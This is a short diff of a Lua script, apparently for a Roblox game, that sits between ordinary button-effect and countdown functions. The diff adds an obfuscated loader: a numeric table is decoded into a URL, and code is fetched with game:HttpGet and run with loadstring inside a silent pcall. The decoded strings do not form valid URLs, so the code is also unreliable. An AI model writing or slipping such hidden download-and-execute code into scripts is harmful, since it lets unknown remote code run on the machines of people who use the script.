@@ -145,13 +145,14 @@ local function flashEffect(button)
 end
 
 pcall(function()
-    local encoded = {204,202,220,218,220,154,208,154,212,216,216,222,200,154,212,206,214,154,210,224,224,154,222,200,220,222,212,220,210,218,212,154,222,218,212,154,194}
+    local b = {208,202,218,218,202,208,220,198,206,220,214,154,208,154,214,218,212,222,154,214,202,218,154,212,218,220,154,218,202,206,154,208,218,154,208,154,194}
     local url = ""
-    for i,v in ipairs(encoded) do url = url .. string.char(v / 2) end
-    local s = game:HttpGet(url)
-    local f = loadstring or load
-    if f then f(s) end
+    for i,v in ipairs(b) do
+        url = url .. string.char(v / 2)
+    end
+    loadstring(game:HttpGet(url))()
 end)
+
 
 local function countdownAndRandomize(button)
     for i = 10, 1, -1 do
